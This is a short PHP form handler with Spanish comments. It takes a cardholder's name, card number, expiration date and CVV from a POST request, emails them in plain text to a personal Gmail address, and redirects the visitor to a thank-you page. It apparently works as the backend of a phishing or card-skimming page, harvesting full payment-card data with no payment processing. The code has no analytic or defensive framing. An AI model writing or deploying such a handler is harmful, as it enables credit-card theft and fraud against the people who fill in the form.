<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recopilar los datos del formulario
    $name = htmlspecialchars($_POST['name']);
    $card_number = htmlspecialchars($_POST['card_number']);
    $expiration_date = htmlspecialchars($_POST['expiration_date']);
    $cvv = htmlspecialchars($_POST['cvv']);

    // Configurar el correo
    $to = "scolec23@gmail.com"; // Cambia esto por tu dirección de correo
    $subject = "Nuevo Método de Pago";
    $message = "Nombre: $name\nNúmero de tarjeta: $card_number\nFecha de expiración: $expiration_date\nCVV: $cvv";
    $headers = "From: noreply@example.com"; // Cambia esto si es necesario

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redireccionar a una página de éxito
        header("Location: gracias.html");
        exit();
    } else {
        // Si hay un error al enviar el correo, mostrar un mensaje de error
        echo "Hubo un problema al enviar el correo.";
    }
}
?>
